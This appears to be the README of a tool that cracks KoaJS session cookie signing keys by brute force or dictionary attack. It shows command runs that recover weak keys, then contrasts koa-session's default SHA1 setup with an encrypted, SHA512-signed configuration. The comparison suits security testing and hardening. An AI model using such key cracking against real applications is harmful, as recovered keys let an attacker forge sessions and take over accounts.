# Crack KoaJS

## Crack examples

```
$ python3 sign.py hello
Cookie: koa:sess=value
Signature: eKTTNYhB_MLfIHmYD_sZPFUEBhE
```

```
$ time python3 crack_koajs.py --min 5 --max 5 --cookie 'koa:sess=value' --signature eKTTNYhB_MLfIHmYD_sZPFUEBhE
Length tried: 5
Found api-key: hello

real    12m7,875s
user    12m5,948s
sys 0m0,142s
```

``` 
$ time python3 crack_koajs.py --dictionnary dict.txt --cookie 'koa:sess=value' --signature eKTTNYhB_MLfIHmYD_sZPFUEBhE
Found api-key: hello

real    0m0,055s
user    0m0,046s
sys 0m0,009s
```

### Default config

You can compare the difference between the `examples/default_config` and the `examples/secured_config`.

  - koa-session
  - algorithm: sha1
  - encoding: base64

```
$ nodejs examples/default_config/default_config.js 
http://localhost:3000/
koa:sess=eyJ2aWV3cyI6MiwiX2V4cGlyZSI6MTU3Mjk2MjUyMzE4NCwiX21heEFnZSI6ODY0MDAwMDB9; koa:sess.sig=ngESdazh11CH6XAWLQejzuEGkOA


$ time python3 crack_koajs.py --min 2 --max 2 -c koa:sess=eyJ2aWV3cyI6MiwiX2V4cGlyZSI6MTU3Mjk2MjUyMzE4NCwiX21heEFnZSI6ODY0MDAwMDB9 -s ngESdazh11CH6XAWLQejzuEGkOA
Length tried: 2
Found api-key: aa

real    0m0,078s
user    0m0,062s
sys 0m0,012s
```

### Secured config

  - koa-encrypted-session
  - algorithm: sha512
  - encryption: AES256-GCM

```
$ nodejs examples/secured_config/secured_config.js 
http://localhost:3001/
koa:sess=eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..7ULfXVeFbj6V7eij.b2Mal3PlnlLeaR44PLqoO2DswYYg4yeLkrrRvJl9nYJ45PhQiV6bzacpj00dPeGd6k_eRWWCew.JqCF1rqAzkyiMQHAX4__uQ; koa:sess.sig=mmP7DNqnN83klkZwVY6dBXaAbHMJ0xdwfBSN2zobE6f8Wa6bynqn4MYwhA99QEsZh56dlyrxprltyxm9aGAutw
```

You can compare these files : `examples/default_config/default_config.js` and `examples/secured_config/secured_config.js`.
